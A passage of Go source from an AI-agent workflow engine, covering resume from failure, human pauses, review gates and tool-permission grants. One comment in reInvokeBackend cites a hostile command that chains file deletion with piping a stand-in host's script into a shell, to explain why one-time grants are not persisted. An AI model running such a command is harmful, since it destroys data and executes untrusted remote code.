	if err := e.claimForFailureResume(ctx, runID, cp, restartNodeID); err != nil {
		return err
	}
	if err := e.failSpentBudgetBeforeResume(ctx, r); err != nil {
		return err
	}

	if err := e.restoreResumeWorkspace(r); err != nil {
		return err
	}

	// Re-bootstrap the sandbox container. The original Run() process
	// owned it through a defer that ran on exit, so a resumed run finds
	// e.sandbox == nil and would otherwise fall back to running every
	// tool node on the host. Without this, recipes that rely on the
	// sandbox toolchain (modern dash for `set -o pipefail`, /workspace
	// bind mount, the slim image's git/jq/curl/node pinned versions,
	// ...) silently fail in confusing ways post-resume. r.RepoRoot is
	// the source of truth for the original repo root; engineRepoRoot
	// is the worktree-less fallback for older runs.
	repoRoot := r.RepoRoot
	if repoRoot == "" {
		repoRoot = engineRepoRoot(e.workDir)
	}
	sandboxCleanup, sbErr := e.startSandbox(ctx, runID, repoRoot, resolveWorktreeGitDir(repoRoot, r.WorkDir), r.Inputs)
	if sbErr != nil {
		return e.parkResumeSandboxFailure(ctx, runID, cp, e.workflow.Entry, sbErr)
	}
	defer sandboxCleanup()

	rs := e.newRunState(runID, r.Inputs)
	rs.vars = e.resolveVars(r.Inputs)
	// Same reason as the paused-resume path above: without this every
	// {{attachments.<name>}} reference silently resolves to nothing for
	// the rest of a resumed run.
	rs.attachments = e.loadAttachmentInfos(ctx, runID)
	e.restoreCheckpointState(rs, cp)
	e.adoptCheckpointSessions(rs)
	// Re-apply live-steering grants (bump_loop / raise_budget) persisted
	// on the run record, so a bumped ceiling survives the resume.
	e.applySteeringState(rs, r)
	rs.isWorktree = r.Worktree
	// Same as the paused-resume builder: this state came from a RESUME, so
	// its first workspace boundary closes the interval the run was stopped
	// in. The failure path has its own runState constructor, which is
	// exactly how it was missed once already.
	rs.resumed = true

	e.pushExecutorVars(rs.vars)

	e.restampWorkflowSource(ctx, r)
	loopErr := e.execLoop(ctx, rs, restartNodeID)
	e.evictRunSessions(runID, loopErr)
	// Mirrors resumeFromPause: a worktree run that fails resumably and
	// then completes on resume must finalize, otherwise its commits
	// stay reflog-only. See F-RT-1.
	if wtCtx := e.reconstructWorktreeContext(r); wtCtx != nil {
		e.finalizeOnExit(ctx, runID, wtCtx, nil, loopErr)
	}
	return loopErr
}

// claimForFailureResume atomically claims a failed/cancelled/operator-paused
// run for this execution, then emits run_resumed carrying
// {resumed_from, restart_node} (+ from_entry=true when no checkpoint
// exists). The compare-and-set on the status (vs an unconditional write)
// rejects a second concurrent resume — e.g. an operator /resume racing a
// studio-restart reconcile — so two engines never execute the same run and
// race on run.json. That race is what left a live run mislabeled
// `failed_resumable` (the failing execution's write clobbered the running
// one's). RunStatusQueued: cloud resumes arrive with the publisher's queued
// flip already applied (see Resume's queued case — routed here only when a
// checkpoint exists). The CAS still rejects double claims.
func (e *Engine) claimForFailureResume(ctx context.Context, runID string, cp *store.Checkpoint, restartNodeID string) error {
	claimed, claimErr := e.store.UpdateRunStatusIf(ctx, runID, store.RunStatusRunning, "",
		[]store.RunStatus{store.RunStatusFailedResumable, store.RunStatusCancelled, store.RunStatusPausedOperator, store.RunStatusQueued})
	if claimErr != nil {
		return fmt.Errorf("runtime: claim run for resume: %w", claimErr)
	}
	if !claimed {
		return fmt.Errorf("runtime: run %q is already being executed (status no longer resumable); refusing duplicate resume", runID)
	}
	resumeData := map[string]any{
		"resumed_from": "failed",
		"restart_node": restartNodeID,
	}
	if cp == nil {
		resumeData["from_entry"] = true
	}
	return e.emit(ctx, runID, store.EventRunResumed, "", resumeData)
}

// restoreResumeWorkspace re-establishes the per-run working environment on
// the failed-resumable path: the per-run env (workDir + executor wiring —
// cp.Vars is not the source of truth; vars are re-resolved from r.Inputs so
// any engine-side fix, e.g. env-var expansion of overrides, applies on
// resume too), bundle skills re-mirrored (F-RT-7 — same rationale as
// resumeFromPause: a bundle upgrade between launch and resume would
// otherwise leave the agent reading stale skill content), plugin
// contributions + hooks (best-effort), and the preset's "## Focus" bias +
// library skill hints so a failed-then-resumed run keeps running as the
// selected sous-bot.
func (e *Engine) restoreResumeWorkspace(r *store.Run) error {
	e.restoreRunEnv(r)
	ClearSkillTierMarkers(e.workDir)
	ownedSkills, err := mirrorBundleSkills(e.workDir, e.bundle, e.logger)
	if err != nil {
		return fmt.Errorf("runtime: bundle skills (resume): %w", err)
	}
	ownedPluginSkills, err := mirrorPluginContributions(e.workDir, e.contributions, e.logger)
	if err != nil && e.logger != nil {
		e.logger.Warn("runtime: plugin contributions (resume): %v", err)
	}
	ownedSkills = append(ownedSkills, ownedPluginSkills...)
	if err := mergePluginHooks(e.workDir, e.logger); err != nil && e.logger != nil {
		e.logger.Warn("runtime: plugin hooks (resume): %v", err)
	}
	e.applyMirroredSkills(append(ownedSkills, e.applyLibrarySkills()...))
	e.applyPresetFocus()
	return nil
}

// restoreCheckpointState rehydrates the runState from a checkpoint:
// outputs, artifacts, loop/round-robin counters, artifact versions, node
// attempts, loop snapshots, budget accounting, and the backend
// rehydration pin. A nil cp is a no-op — rs keeps the empty maps from
// newRunState (same state shape as a fresh launch; only the run_id is
// preserved so the studio's snapshot continuity stays intact).
func (e *Engine) restoreCheckpointState(rs *runState, cp *store.Checkpoint) {
	if cp == nil {
		return
	}
	// Deep-copy outputs so subsequent writes on rs.outputs don't
	// retroactively mutate r.Checkpoint (which any HTTP read still
	// holding the run pointer could iterate concurrently). Same
	// sibling-isolation discipline as fan_out.go's copyOutputs.
	rs.outputs = copyOutputs(cp.Outputs)
	if rs.outputs == nil {
		rs.outputs = make(map[string]map[string]any)
	}
	rs.artifacts = e.rebuildArtifacts(rs.outputs)
	// Deep-COPY the counter maps (not alias): selectEdgeRS/execLoop
	// mutate loopCounters/roundRobinCounters and artifactVersions in
	// place, so aliasing cp.* (== r.Checkpoint.*) would let the engine
	// write a map an HTTP read still holding the run pointer could
	// iterate concurrently — a fatal concurrent map read+write. Same
	// sibling-isolation reasoning as the copyOutputs above. A nil source
	// leaves the empty map newRunState allocated (avoids a first-write nil
	// panic).
	if cp.LoopCounters != nil {
		rs.loopCounters = cloneMap(cp.LoopCounters)
	}
	if cp.RoundRobinCounters != nil {
		rs.roundRobinCounters = cloneMap(cp.RoundRobinCounters)
	}
	if cp.ArtifactVersions != nil {
		rs.artifactVersions = cloneMap(cp.ArtifactVersions)
	}
	rs.nodeAttempts = restoreNodeAttempts(cp.NodeAttempts)
	restoreLoopSnapshots(rs, cp)
	restoreBudgetAccounting(rs, cp)
	restoreSelectedIncoming(rs, cp)
	restoreRunEvents(rs, cp)
	pinBackendRehydration(rs, cp)
	rs.nodeSessions = cloneNodeSessions(cp.NodeSessions)
	if rs.nodeSessions == nil {
		rs.nodeSessions = make(map[string]store.NodeSessionSlot)
	}
	rs.pauseSessionRef = cp.BackendSessionStateRef
	if cp.Parallel != nil {
		rs.parallel = newParallelExecutionState(cp.Parallel)
	}
}

// pinBackendRehydration pins a checkpoint's backend conversation (claw) or
// session id (claude_code) onto runState so the first execution of
// cp.NodeID injects them into the input map (fork rehydration). Cleared
// after the first injection so downstream nodes don't accidentally
// rehydrate.
func pinBackendRehydration(rs *runState, cp *store.Checkpoint) {
	if len(cp.BackendConversation) == 0 && cp.BackendSessionID == "" {
		return
	}
	rs.resumeBackend = resumeBackendState{
		nodeID:       cp.NodeID,
		conversation: cp.BackendConversation,
		sessionID:    cp.BackendSessionID,
	}
}

// restoreRunEnv re-establishes the engine's working directory from the
// persisted run record, then propagates it to the executor. Mirrors the
// pre-loop initialisation in Run(): without this, resumed runs that
// originally used `worktree: auto` would lose track of their per-run
// worktree path and tool nodes / backend subprocesses would land in the
// main checkout (or even the iterion process cwd) — fatal for
// commit_changes which expects to operate inside the run's worktree.
//
// The persisted r.WorkDir was added by Run() after worktree creation, so
// it always carries the right absolute path even when the worktree on
// disk was removed (in which case the failing tool will produce a clear
// error rather than silently ending up somewhere else).
func (e *Engine) restoreRunEnv(r *store.Run) {
	if r.WorkDir != "" {
		e.workDir = r.WorkDir
	} else if e.workDir == "" {
		if cwd, err := os.Getwd(); err == nil {
			e.workDir = cwd
		}
	}
	// Mirror the run's repo root onto the engine so resolveVars's
	// `${PROJECT_MEMORY_DIR}` expansion finds the same path it did
	// on the original launch — without this, a resumed run on a
	// dispatcher worktree falls back to e.workDir's encoded key
	// and the memory tree silently moves.
	e.repoRoot = r.RepoRoot
	if s, ok := e.executor.(workDirSetter); ok {
		s.SetWorkDir(e.workDir)
	}
	if s, ok := e.executor.(repoRootSetter); ok {
		s.SetRepoRoot(r.RepoRoot)
	}
}

// pushExecutorVars refreshes the executor's vars map. Used after every
// resolveVars on the resume path; the launch path does this inline in
// Run().
func (e *Engine) pushExecutorVars(vars map[string]any) {
	if sv, ok := e.executor.(varsSetter); ok {
		sv.SetVars(vars)
	}
}

// ---------------------------------------------------------------------------
// Human node execution
// ---------------------------------------------------------------------------

// execAutoOrPauseHuman handles a human node in auto_or_pause mode.
// It calls the executor (LLM) to produce answers plus a needs_human_input flag.
// Returns (true, nil) if the run was paused, (false, nil) if the LLM answered.
func (e *Engine) execAutoOrPauseHuman(ctx context.Context, rs *runState, nodeID string, node ir.Node) (bool, error) {
	// Emit node_started.
	iter := e.currentLoopIteration(nodeID, rs.loopCounters)
	if err := e.emit(rs.ctx, rs.runID, store.EventNodeStarted, nodeID, map[string]any{
		"kind":      node.NodeKind().String(),
		"iteration": iter,
	}); err != nil {
		return false, err
	}

	// Check budget.
	if err := e.checkBudgetBeforeExec(rs, nodeID); err != nil {
		return false, err
	}

	// Build input and execute LLM.
	nodeInput := e.buildNodeInputRS(nodeID, rs.scope())
	execCtx := model.WithLoopIteration(ctx, iter)
	output, err := e.executor.Execute(execCtx, node, nodeInput)
	if err != nil {
		// The llm half of llm_or_human is an OPTIMIZATION — it auto-answers
		// the routine case so a human is only pulled in for a real decision.
		// When that helper itself cannot run (no credential for the direct
		// generation path, a provider outage, a bad model spec), killing the
		// run inverts the node's whole purpose: it exists to hand over, and
		// the failure hits at the exact moment a hand-over was warranted.
		// Observed in production (2026-08-04): Vetty's first-ever escalation
		// died on a 401 instead of asking the operator. So degrade to the
		// human half — the same pause the LLM produces when it declines to
		// answer. Cancellation still propagates: a run being stopped is not
		// a helper failure.
		if ctx.Err() != nil {
			return false, e.failRunWithCheckpoint(rs, nodeID, fmt.Sprintf("human node %q auto_or_pause execution failed: %v", nodeID, err))
		}
		e.logger.Warn("human node %q: llm half failed (%v) — falling back to a human pause", nodeID, err)
		_ = e.emit(rs.ctx, rs.runID, store.EventNodeRecovery, nodeID, map[string]any{
			"strategy": "llm_or_human_fallback",
			"reason":   err.Error(),
		})
		if perr := e.persistPause(rs, nodeID); perr != nil {
			return false, perr
		}
		return true, nil
	}

	// Record budget usage.
	if err := e.recordAndCheckBudget(rs, nodeID, output); err != nil {
		return false, err
	}

	// Inspect the needs_human_input flag.
	needsHuman := false
	if v, ok := output["needs_human_input"]; ok {
		if b, ok := v.(bool); ok {
			needsHuman = b
		}
	}

	// Strip the wrapper field from the output.
	delete(output, "needs_human_input")

	if needsHuman {
		if err := e.persistPause(rs, nodeID); err != nil {
			return false, err
		}
		return true, nil
	}

	// LLM decided no human input needed — store output and continue.
	rs.outputs[nodeID] = output

	// Validate output against declared schema (optional).
	if err := e.validateNodeOutput(nodeID, node, output); err != nil {
		return false, e.failRunErrWithCheckpoint(rs, nodeID, err)
	}

	// Persist artifact if node has publish.
	if pub := nodePublish(node); pub != "" {
		version := rs.artifactVersions[nodeID]
		artifact := &store.Artifact{
			RunID:   rs.runID,
			NodeID:  nodeID,
			Version: version,
			Data:    output,
		}
		if err := e.store.WriteArtifact(ctx, artifact); err != nil {
			return false, fmt.Errorf("runtime: write artifact: %w", err)
		}
		rs.artifactVersions[nodeID] = version + 1
		rs.artifacts[pub] = output
		_ = e.emit(rs.ctx, rs.runID, store.EventArtifactWritten, nodeID, map[string]any{
			"publish": pub,
			"version": version,
		})
	}

	// Emit node_finished.
	nodeFinishedData := buildNodeFinishedData(e.sanitizeOutputForEvent(node, output))
	if err := e.emit(rs.ctx, rs.runID, store.EventNodeFinished, nodeID, nodeFinishedData); err != nil {
		return false, err
	}
	if e.onNodeFinished != nil {
		e.onNodeFinished(rs.runID, nodeID, output)
	}

	// Best-effort checkpoint for resume-from-failed (parity with execLoopAfterExec).
	if err := e.store.SaveCheckpoint(rs.ctx, rs.runID, buildCheckpoint(rs, nodeID)); err != nil {
		e.logger.Error("failed to save checkpoint after node %q: %v", nodeID, err)
	}
	// Per-node snapshot so the Fork API's rewind_code=true mode has an anchor.
	e.snapshotAtNodeBoundary(rs, nodeID)

	return false, nil
}

// ---------------------------------------------------------------------------
// Human pause
// ---------------------------------------------------------------------------

// pauseAtHuman suspends the run at a human node: persists an interaction,
// saves checkpoint state, and returns ErrRunPaused.
func (e *Engine) pauseAtHuman(rs *runState, nodeID string, node ir.Node) error {
	// Emit node_started for the human node.
	if err := e.emit(rs.ctx, rs.runID, store.EventNodeStarted, nodeID, map[string]any{
		"kind":      node.NodeKind().String(),
		"iteration": e.currentLoopIteration(nodeID, rs.loopCounters),
	}); err != nil {
		return err
	}

	if err := e.persistPause(rs, nodeID); err != nil {
		return err
	}

	return ErrRunPaused
}

// persistPause writes the interaction, emits pause events, and saves the
// checkpoint. It contains the shared logic used by both pauseAtHuman and
// execAutoOrPauseHuman. The caller is responsible for emitting node_started
// before calling this method.
func (e *Engine) persistPause(rs *runState, nodeID string) error {
	questions := e.buildNodeInputRS(nodeID, resolveScope{
		vars:      rs.vars,
		outputs:   rs.outputs,
		runInputs: nil,
		artifacts: rs.artifacts,
		rs:        rs,
	})
	return e.doPause(rs, nodeID, questions, e.humanPauseExtra(nodeID, questions, rs), pauseInfo{})
}

// humanPauseExtra assembles everything the studio needs on the pause
// payload: the author's instructions, plus the review range this gate
// covers.
func (e *Engine) humanPauseExtra(nodeID string, questions map[string]any, rs *runState) map[string]any {
	extra := e.humanInstructionsExtra(nodeID, questions, rs)
	scope := e.markReviewGate(rs, nodeID)
	if len(scope) == 0 {
		return extra
	}
	if extra == nil {
		extra = map[string]any{}
	}
	for k, v := range scope {
		extra[k] = v
	}
	return extra
}

// markReviewGate anchors the workspace at a human gate and returns the
// range the reviewer is being asked to approve: everything since the
// previous gate.
//
// Deriving the range from gates rather than from a declared node list is
// what makes it complete. A per-node range can only cover nodes that have
// boundary refs, which excludes subbots, fan-out branches and every
// specially-dispatched kind — precisely where pipelines put their
// implementation work. A gate-to-gate range is a workspace before/after,
// so nothing a run did can fall outside it; attributing files to
// individual nodes is then presentation, and what cannot be attributed is
// shown as such rather than lost.
//
// Unlike a node boundary this takes a REAL capture instead of aliasing
// the last one: a gate is rare, and the node before it may have been
// specially dispatched, in which case the remembered anchor was
// deliberately invalidated and aliasing would silently miss that node's
// work.
//
// Two backends, same contract:
//
//   - worktree: auto → git refs (refs/iterion/runs/<id>/gate/<seq>)
//   - in-place (default) → workspacetrack labels (gate:<seq>), which is
//     the only safe capture of the operator's live checkout and which
//     honours .iterionignore rather than .gitignore
func (e *Engine) markReviewGate(rs *runState, nodeID string) map[string]any {
	if e.workDir == "" {
		return nil
	}
	// Idempotent per (node, iteration): a review gate anchors when it
	// STARTS, so its companion judges the same range the human will see.
	// The pause then asks for the same anchor and must get the one already
	// taken, not a fresh capture with a moved head.
	key := fmt.Sprintf("%s@%d", nodeID, e.currentLoopIteration(nodeID, rs.loopCounters))
	if rs.gateAnchors == nil {
		rs.gateAnchors = map[string]int{}
	}
	if seq, ok := rs.gateAnchors[key]; ok {
		return reviewGateScope(rs.runID, seq, rs.isWorktree)
	}
	if rs.isWorktree {
		return e.markReviewGateGit(rs, nodeID, key)
	}
	return e.markReviewGateWorkspace(rs, nodeID, key)
}

func (e *Engine) markReviewGateGit(rs *runState, nodeID, key string) map[string]any {
	seq := nextReviewGateSeq(e.workDir, rs.runID)
	ref := store.ReviewGateRef(rs.runID, seq)
	commit, err := snapshotWorktree(e.workDir, ref)
	if err != nil {
		if e.logger != nil {
			e.logger.Warn("review gate: anchor %q: %v", nodeID, err)
		}
		return nil
	}
	if commit == "" {
		if out, uerr := runGit(e.workDir, "update-ref", ref, "HEAD"); uerr != nil {
			if e.logger != nil {
				e.logger.Warn("review gate: anchor %q at HEAD: %v\noutput: %s", nodeID, uerr, out)
			}
			return nil
		}
	}
	rs.gateAnchors[key] = seq
	return reviewGateScope(rs.runID, seq, true)
}

func (e *Engine) markReviewGateWorkspace(rs *runState, nodeID, key string) map[string]any {
	if e.workspaceTracker == nil {
		return nil
	}
	seq := workspacetrack.NextGateSeq(e.workspaceTracker, rs.runID)
	label := workspacetrack.GateLabel(seq)
	snap, err := e.workspaceTracker.Capture(rs.runID, e.workDir, label)
	if err != nil {
		if e.logger != nil {
			e.logger.Warn("review gate: workspace anchor %q: %v", nodeID, err)
		}
		return nil
	}
	rs.lastWorkspaceSnapshot = snap.ID
	rs.gateAnchors[key] = seq
	return reviewGateScope(rs.runID, seq, false)
}

// reviewGateScope is the pause-payload shape describing a gate's range.
func reviewGateScope(runID string, seq int, worktree bool) map[string]any {
	scope := map[string]any{
		"review_gate_seq": seq,
	}
	if worktree {
		scope["review_head_ref"] = store.ReviewGateRef(runID, seq)
		if seq > 0 {
			scope["review_base_ref"] = store.ReviewGateRef(runID, seq-1)
		}
		return scope
	}
	scope["review_head_ref"] = workspacetrack.GateLabel(seq)
	if seq > 0 {
		scope["review_base_ref"] = workspacetrack.GateLabel(seq - 1)
	}
	return scope
}

// nextReviewGateSeq returns the next free gate number, read from git so a
// resumed run continues the sequence instead of restarting it.
func nextReviewGateSeq(workDir, runID string) int {
	prefix := strings.TrimSuffix(store.ReviewGateRef(runID, 0), "0")
	out, err := runGit(workDir, "for-each-ref", "--format=%(refname)", prefix)
	if err != nil {
		return 0
	}
	max := -1
	for _, line := range strings.Split(strings.TrimSpace(out), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if n, cerr := strconv.Atoi(line[strings.LastIndex(line, "/")+1:]); cerr == nil && n > max {
			max = n
		}
	}
	return max + 1
}

// humanInstructionsExtra resolves a human node's `instructions:` prompt
// against the paused node's questions (its resolved input) so the studio
// can show the operator the author's per-situation context instead of the
// generic "Reply to continue." fallback. Returns nil when the node has no
// instructions prompt — doPause then omits the field. The resolved text
// rides on the human_input_requested event, which is persisted in
// events.jsonl, so both the live WS path and a page reload (event refetch)
// surface it.
func (e *Engine) humanInstructionsExtra(nodeID string, questions map[string]any, rs *runState) map[string]any {
	node, ok := e.workflow.Nodes[nodeID]
	if !ok {
		return nil
	}
	hn, ok := node.(*ir.HumanNode)
	if !ok || hn.Instructions == "" {
		return nil
	}
	p := e.workflow.Prompts[hn.Instructions]
	if p == nil {
		return nil
	}
	text := e.renderHumanInstructions(p, questions, rs)
	if strings.TrimSpace(text) == "" {
		return nil
	}
	return map[string]any{"instructions": text}
}

// renderHumanInstructions substitutes a prompt body's {{...}} references
// against the paused node's questions (the {{input.*}} namespace) plus the
// run vars / outputs / artifacts. strings.NewReplacer does a single
// left-to-right pass that never re-scans substituted output, so a value
// that itself contains a "{{...}}" literal can't cascade into later refs.
func (e *Engine) renderHumanInstructions(p *ir.Prompt, questions map[string]any, rs *runState) string {
	if p == nil {
		return ""
	}
	if len(p.TemplateRefs) == 0 {
		return p.Body
	}
	pairs := make([]string, 0, 2*len(p.TemplateRefs))
	for _, ref := range p.TemplateRefs {
		val := e.resolveRef(ref, resolveScope{
			vars:      rs.vars,
			outputs:   rs.outputs,
			runInputs: questions,
			artifacts: rs.artifacts,
			rs:        rs,
		})
		pairs = append(pairs, ref.Raw, renderInstructionValue(val))
	}
	return strings.NewReplacer(pairs...).Replace(p.Body)
}

// renderInstructionValue renders a resolved reference value as
// Markdown-friendly text for the operator-facing instructions: scalars
// verbatim, scalar arrays as a bullet list, structured values as a fenced
// JSON block.
func renderInstructionValue(v any) string {
	switch val := v.(type) {
	case nil:
		return ""
	case string:
		return val
	case bool:
		if val {
			return "true"
		}
		return "false"
	case []any:
		// Any nested map/slice → render the whole array as a JSON block;
		// a flat scalar array → a Markdown bullet list.
		for _, it := range val {
			switch it.(type) {
			case map[string]any, []any:
				return jsonInstructionBlock(val)
			}
		}
		lines := make([]string, 0, len(val))
		for _, it := range val {
			lines = append(lines, "- "+fmt.Sprintf("%v", it))
		}
		return strings.Join(lines, "\n")
	case map[string]any:
		return jsonInstructionBlock(val)
	default:
		return fmt.Sprintf("%v", val)
	}
}

func jsonInstructionBlock(v any) string {
	b, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		return fmt.Sprintf("%v", v)
	}
	return "```json\n" + string(b) + "\n```"
}

// coerceAnswersToSchema converts string-typed human answers into the field
// types the node's output schema declares. `iterion resume --answer
// key=value` can only carry strings, so without this a `when approved`
// edge sees "true" (a string) and fails its bool check — the run dies with
// NO_OUTGOING_EDGE. Only string values are converted; anything already of
// the right Go type (a JSON --answers-file, or the studio's pre-coerced
// POST) passes through untouched.
func (e *Engine) coerceAnswersToSchema(humanNodeID string, answers map[string]any) map[string]any {
	hn, ok := e.workflow.Nodes[humanNodeID].(*ir.HumanNode)
	if !ok || hn.OutputSchema == "" {
		return answers
	}
	schema := e.workflow.Schemas[hn.OutputSchema]
	if schema == nil {
		return answers
	}
	for _, f := range schema.Fields {
		s, isStr := answers[f.Name].(string)
		if !isStr {
			continue
		}
		if v, ok := coerceStringToFieldType(s, f.Type); ok {
			answers[f.Name] = v
		}
	}
	return answers
}

// coerceStringToFieldType parses a CLI-supplied string into the Go value a
// schema field type expects. Returns ok=false (leaving the raw string in
// place) when the string isn't a clean instance of the type, so a bad
// --answer surfaces downstream rather than being silently zeroed.
func coerceStringToFieldType(s string, t ir.FieldType) (any, bool) {
	switch t {
	case ir.FieldTypeBool:
		switch s {
		case "true":
			return true, true
		case "false":
			return false, true
		}
		return nil, false
	case ir.FieldTypeInt:
		if n, err := strconv.Atoi(strings.TrimSpace(s)); err == nil {
			return n, true
		}
		return nil, false
	case ir.FieldTypeFloat:
		if f, err := strconv.ParseFloat(strings.TrimSpace(s), 64); err == nil {
			return f, true
		}
		return nil, false
	case ir.FieldTypeJSON, ir.FieldTypeStringArray:
		ts := strings.TrimSpace(s)
		if ts == "" {
			return nil, false
		}
		var v any
		if err := json.Unmarshal([]byte(ts), &v); err == nil {
			return v, true
		}
		return nil, false
	}
	return nil, false
}

// ---------------------------------------------------------------------------
// Delegate interaction handling
// ---------------------------------------------------------------------------

// maxInteractionDepth caps the number of consecutive interaction
// auto-responses for a single node within one run. Each ErrNeedsInteraction
// → handleNeedsInteraction → reInvokeBackend cycle increments depth; the
// guard fires before reaching the budget/iteration limits, surfacing a
// clear error rather than silently grinding on a runaway LLM that keeps
// re-asking. 5 is generous for legitimate multi-turn dialogues — most
// real interactions resolve in 1–2 rounds.
const maxInteractionDepth = 5

// errInteractionHandledInline is an execLoop-internal control-flow sentinel.
// When a node with interaction: llm / llm_or_human auto-answers, the inline
// path (handleNeedsInteraction → handleInteractionLLM → reInvokeBackend) drives
// the REST of the workflow to completion via its own execLoop and returns nil.
// execLoopRunNode converts that nil into this sentinel so the outer execLoop
// STOPS rather than falling through to execLoopAfterExec — which would
// re-process the current node with a nil output and re-run every downstream
// node a second time (overwriting outputs, emitting duplicate node_finished).
// execLoop translates it back to nil; it never escapes the engine.
var errInteractionHandledInline = errors.New("interaction handled inline")

// handleNeedsInteraction is called when a delegate or LLM signals it needs
// user input. The behavior depends on the node's InteractionMode:
//   - InteractionHuman: pause the workflow for human input
//   - InteractionLLM: auto-respond using the interaction model
//   - InteractionLLMOrHuman: LLM decides whether to respond or escalate
//
// depth tracks the number of consecutive auto-respond cycles for the
// current node. External callers pass 0; the recursive callsite in
// reInvokeBackend forwards depth+1.
func (e *Engine) handleNeedsInteraction(ctx context.Context, rs *runState, nodeID string, node ir.Node, ni *model.ErrNeedsInteraction, depth int) error {
	if depth > maxInteractionDepth {
		return e.failRunWithCheckpoint(rs, nodeID, fmt.Sprintf(
			"node %q exceeded interaction recursion depth (%d > %d) — backend kept escalating without converging",
			nodeID, depth, maxInteractionDepth))
	}
	// A tool-permission `ask` pause is inherently a human approval request:
	// pause regardless of the node's interaction: mode (the gate is its own
	// reason to pause — an agent/judge need not opt into interaction: to be
	// gated). Detected by the structured marker the gate stashes.
	if _, isPermission := ni.Questions[permission.InteractionMarkerKey]; isPermission {
		return e.pauseForBackendInteraction(rs, nodeID, ni)
	}
	// An await_answers tool escalation (ADR-081) has its own handling:
	// re-check the store first, and only pause when questions are
	// genuinely still pending.
	if _, isAwait := ni.Questions[delegate.AwaitPendingInteractionsKey]; isAwait {
		return e.handleAwaitEscalation(ctx, rs, nodeID, node, ni, depth)
	}
	switch nodeInteraction(node) {
	case ir.InteractionHuman, ir.InteractionAsync:
		// interaction: async only changes the NON-blocking tools; a
		// blocking ask_user from such a node is a deliberate hard stop,
		// identical to interaction: human.
		return e.pauseForBackendInteraction(rs, nodeID, ni)

	case ir.InteractionLLM:
		return e.handleInteractionLLM(ctx, rs, nodeID, node, ni, depth)

	case ir.InteractionLLMOrHuman:
		return e.handleInteractionLLMOrHuman(ctx, rs, nodeID, node, ni, depth)

	default:
		// InteractionNone should not reach here (executor wouldn't return ErrNeedsInteraction).
		return fmt.Errorf("runtime: node %q received interaction request but has interaction: none", nodeID)
	}
}

// handleInteractionLLM invokes the interaction model to auto-respond to the
// delegate's questions, then re-invokes the backend with the answers.
func (e *Engine) handleInteractionLLM(ctx context.Context, rs *runState, nodeID string, node ir.Node, ni *model.ErrNeedsInteraction, depth int) error {
	clawExec, ok := e.executor.(*model.ClawExecutor)
	if !ok {
		// Fallback to pause if executor doesn't support interaction LLM.
		return e.pauseForBackendInteraction(rs, nodeID, ni)
	}

	fields := interactionFields(node)
	answers, _, err := clawExec.ExecuteHumanLLMForInteraction(ctx, nodeID, ni, fields)
	if err != nil {
		return e.failRunWithCheckpoint(rs, nodeID,
			fmt.Sprintf("interaction LLM for node %q failed: %v", nodeID, err))
	}

	// Re-invoke the backend with the LLM-generated answers.
	return e.reInvokeBackend(ctx, rs, nodeID, node, ni, answers, depth)
}

// handleInteractionLLMOrHuman invokes the interaction model to decide whether
// to auto-respond or escalate to a human. If the LLM sets needs_human_input=true,
// the run is paused for human input.
func (e *Engine) handleInteractionLLMOrHuman(ctx context.Context, rs *runState, nodeID string, node ir.Node, ni *model.ErrNeedsInteraction, depth int) error {
	clawExec, ok := e.executor.(*model.ClawExecutor)
	if !ok {
		return e.pauseForBackendInteraction(rs, nodeID, ni)
	}

	fields := interactionFields(node)
	answers, needsHuman, err := clawExec.ExecuteHumanLLMForInteraction(ctx, nodeID, ni, fields)
	if err != nil {
		return e.failRunWithCheckpoint(rs, nodeID,
			fmt.Sprintf("interaction LLM for node %q failed: %v", nodeID, err))
	}

	if needsHuman {
		// LLM decided it needs human input — pause.
		return e.pauseForBackendInteraction(rs, nodeID, ni)
	}

	// LLM auto-responded — re-invoke the backend.
	return e.reInvokeBackend(ctx, rs, nodeID, node, ni, answers, depth)
}

// reInvokeBackend re-invokes the delegate backend with the LLM-provided
// answers merged into the node input. It uses the delegate's session ID
// for session continuity so the backend can resume where it left off.
//
// When the prior interaction came from the native ask_user tool, the
// question text is also relayed via reserved keys so the executor can
// prepend a "[PRIOR INTERACTION]" block to the user prompt — without
// this, claw's stateless re-invocation would lose the question and the
// LLM might call ask_user with the same question again.
func (e *Engine) reInvokeBackend(ctx context.Context, rs *runState, nodeID string, node ir.Node, ni *model.ErrNeedsInteraction, answers map[string]any, depth int) error {
	// CLOSE the stop window before re-invoking. This path does not go
	// through markPreNodeBoundary — the node never re-enters the dispatch
	// loop, it picks up mid-conversation — so without this the workspace
	// has no boundary between the pause and the NEXT node's, and every
	// file the agent writes after the operator answers falls inside the
	// interval the pause opened. A scoped rewind then reads that whole
	// interval as "changed while nothing was executing", leaves the
	// agent's own production on disk, and the replay meets it again.
	//
	// `pre:<node>:<iter>` already exists here by construction (the node
	// ran before it asked), so this records `resume:<node>:<iter>`.
	e.markPreNodeBoundary(rs, nodeID)
	// Build the input for re-invocation: original node input + answers.
	nodeInput := e.buildNodeInputRS(nodeID, rs.scope())
	for k, v := range answers {
		nodeInput[k] = v
	}
	if q, ok := ni.Questions[delegate.AskUserQuestionKey]; ok {
		nodeInput[delegate.PriorAskUserQuestionKey] = q
		if a, ok := answers[delegate.AskUserQuestionKey]; ok {
			nodeInput[delegate.PriorAskUserAnswerKey] = a
		}
	}

	// Tool-permission approval: when the pause carried a permission marker,
	// the operator's answer is an authorization decision. Compute the grant
	// rule here (backend-agnostic) and pass it via GrantInputKey so the
	// executor adds it to the resolved policy — the agent's re-issued call
	// then passes the gate on both backends.
	// Only `allow always` joins the run's accumulated set. The `once`
	// form authorizes the single call the operator was shown — that is
	// exactly what the pause prompt promises, and the rule it produces is
	// argument-scoped, so persisting it would turn one approved
	// `Bash(rm -rf build/*)` into a standing rule that also matches
	// `rm -rf build/x && curl evil.sh | sh` for the rest of the run.
	// The once-grant therefore rides THIS re-invocation and no further.
	if marker, ok := ni.Questions[permission.InteractionMarkerKey]; ok {
		if tool, input, _, ok := permission.ParseMarker(marker); ok {
			answer, _ := answers[delegate.AskUserQuestionKey].(string)
			if rule, approved := permission.GrantFromAnswer(answer, tool, input); approved {
				if _, always := permission.ParseAnswer(answer); always {
					e.recordPermissionGrant(rs, nodeID, rule)
				}
				// GrantInputKey keeps its original meaning: THIS pause was
				// approved. The resume framing reads it to tell the model
				// its call is now authorized, so it must stay empty on a
				// denial even when the run holds earlier grants.
				nodeInput[permission.GrantInputKey] = rule
			}
		}
	}
	// The node's accumulated `always` set is attached by
	// buildNodeInputRS above, so it also reaches an ordinary execution
